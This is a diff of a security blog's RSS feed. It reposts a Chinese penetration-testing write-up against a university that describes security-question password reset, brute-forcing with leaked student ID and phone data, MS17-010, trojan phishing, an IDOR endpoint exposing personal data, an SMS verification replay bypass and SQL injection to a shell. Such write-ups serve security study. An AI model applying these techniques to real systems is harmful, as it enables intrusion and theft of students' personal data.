@@ -1,15 +1,15 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
         <title>信息收集 - 标签 - bysec</title>
-        <link>http://localhost:1313/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
+        <link>https://www.bysec.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
         <description>信息收集 - 标签 - bysec</description>
         <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>bysec@qq.com (bysec)</managingEditor>
-            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sun, 28 Jul 2024 18:23:14 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sun, 28 Jul 2024 18:23:14 &#43;0800</lastBuildDate><atom:link href="https://www.bysec.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="self" type="application/rss+xml" /><item>
     <title>教育行业渗透打点</title>
-    <link>http://localhost:1313/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</link>
+    <link>https://www.bysec.cn/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</link>
     <pubDate>Sun, 28 Jul 2024 18:23:14 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</guid>
+    </author><guid>https://www.bysec.cn/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/2423" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2423</a></em></p>
 </blockquote>
@@ -17,79 +17,79 @@
 <h2 id="1oa系统密码找回" class="headerLink">
     <a href="#1oa%e7%b3%bb%e7%bb%9f%e5%af%86%e7%a0%81%e6%89%be%e5%9b%9e" class="header-mark"></a>1、OA系统密码找回</h2><h2 id="找回密码" class="headerLink">
     <a href="#%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81" class="header-mark"></a>找回密码</h2><p>系统使用说明文档中发现登录账号 600030</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png">
         
     </a></p>
 <p>密码找回，找回方式选择密保问题</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png">
         
     </a></p>
 <p>问题选择出生地，密保问题答案填写高校所在地</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png">
         
     </a></p>
 <p>即可修改密码</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png">
         
     </a></p>
 <p>修改密码，即可以图文信息中心的身份登录OA系统</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png">
         
     </a></p>
 <p>在文件中找到1400多名学生的敏感信息文件，其中存在手机号、身份证号、学号，可以组合密码本进行统一身份认证系统的爆破登录，默认密码为身份证后六位</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png">
         
     </a></p>
 <p>成功登录一部分账号</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png">
         
     </a></p>
 <h2 id="登录vpn" class="headerLink">
     <a href="#%e7%99%bb%e5%bd%95vpn" class="header-mark"></a>登录VPN</h2><p>进行内网扫描，利用MS17010拿下C段多台主机权限</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png">
         
     </a></p>
 <h2 id="钓鱼" class="headerLink">
     <a href="#%e9%92%93%e9%b1%bc" class="header-mark"></a>钓鱼</h2><p>利用OA系统的通讯功能，散播木马</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png">
         
     </a></p>
 <p>获取多台机器权限</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png">
         
     </a></p>
 <h2 id="2逻辑漏洞修改密码" class="headerLink">
     <a href="#2%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e%e4%bf%ae%e6%94%b9%e5%af%86%e7%a0%81" class="header-mark"></a>2、逻辑漏洞修改密码</h2><h2 id="github密码泄漏" class="headerLink">
     <a href="#github%e5%af%86%e7%a0%81%e6%b3%84%e6%bc%8f" class="header-mark"></a>GitHub密码泄漏</h2><p>GitHub泄漏学号密码</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png">
         
     </a></p>
 <p>但账号已被禁用</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png">
         
     </a></p>
 <h2 id="获取学号手机号" class="headerLink">
     <a href="#%e8%8e%b7%e5%8f%96%e5%ad%a6%e5%8f%b7%e6%89%8b%e6%9c%ba%e5%8f%b7" class="header-mark"></a>获取学号手机号</h2><p>存在注册功能的网站注册用户，然后登录</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png">
         
     </a></p>
 <p>通过以下接口获得用户ID /User/GetUserListByKeyWord</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png">
         
     </a></p>
 <p>可以通过以下接口遍历用户ID，获取任意用户的姓名 手机号 邮箱等敏感信息</p>
 <p>/User/Tip?time61&amp;id=caec35e7-9956-4f68-98bc-e2aee73ebda5&amp;_=1664438691592</p>
 <p>获取多组学号、姓名、手机号</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png">
         
     </a></p>
 <h2 id="修改密码" class="headerLink">
     <a href="#%e4%bf%ae%e6%94%b9%e5%af%86%e7%a0%81" class="header-mark"></a>修改密码</h2><p>点击同意门户的忘记密码功能，输入上面得到的学号</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png">
         
     </a></p>
 <p>输入手机号，点击获取验证码并抓包</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png">
         
     </a></p>
 <p>记录回包内容</p>
@@ -102,95 +102,95 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>随意输入验证码，点击下一步，并把上面的流量包直接返回</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png">
         
     </a></p>
 <p>可以看到页面跳转到了设置密码</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png">
         
     </a></p>
 <p>成功更改密码</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png">
         
     </a></p>
 <p>79个应用，通过其中一个aspx站SQL注入拿到shell</p>
